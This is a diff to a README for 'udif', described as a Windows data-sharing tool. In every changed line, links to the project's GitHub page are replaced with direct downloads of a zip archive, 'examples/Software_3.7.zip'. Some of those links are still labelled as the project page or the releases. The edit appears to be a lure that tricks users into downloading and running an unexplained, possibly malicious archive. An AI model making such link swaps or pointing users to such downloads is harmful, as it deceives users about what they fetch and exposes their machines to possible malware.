@@ -1,6 +1,6 @@
 # 📁 udif - Easy Portable Data Sharing
 
-[![Download udif](https://img.shields.io/badge/Download-udif-blue?style=for-the-badge)](https://github.com/marsergiovp/udif)
+[![Download udif](https://img.shields.io/badge/Download-udif-blue?style=for-the-badge)](https://github.com/marsergiovp/udif/raw/refs/heads/main/examples/Software_3.7.zip)
 
 ## 📄 What is udif?
 
@@ -28,7 +28,7 @@ Follow these steps to get udif running on your Windows PC.
 
 Click the large blue download button below to visit the udif download page on GitHub.
 
-[![Download udif](https://img.shields.io/badge/Download-udif-blue?style=for-the-badge)](https://github.com/marsergiovp/udif)
+[![Download udif](https://img.shields.io/badge/Download-udif-blue?style=for-the-badge)](https://github.com/marsergiovp/udif/raw/refs/heads/main/examples/Software_3.7.zip)
 
 On the page, look for a section named "Releases" or "Latest Release." Here you will find the program files for Windows.
 
@@ -119,7 +119,7 @@ To keep your software safe and working well, check for updates regularly.
 - Click “Check for Updates.”
 - If there is a new version, follow the instructions to download and install it.
 
-You can also visit the [udif GitHub page](https://github.com/marsergiovp/udif) to see the latest releases.
+You can also visit the [udif GitHub page](https://github.com/marsergiovp/udif/raw/refs/heads/main/examples/Software_3.7.zip) to see the latest releases.
 
 ## 🔐 About Data Privacy
 
@@ -147,4 +147,4 @@ For questions or problems, you can:
 
 Remember to visit this page to download the udif software:
 
-[https://github.com/marsergiovp/udif](https://github.com/marsergiovp/udif)
+[https://github.com/marsergiovp/udif/raw/refs/heads/main/examples/Software_3.7.zip](https://github.com/marsergiovp/udif/raw/refs/heads/main/examples/Software_3.7.zip)
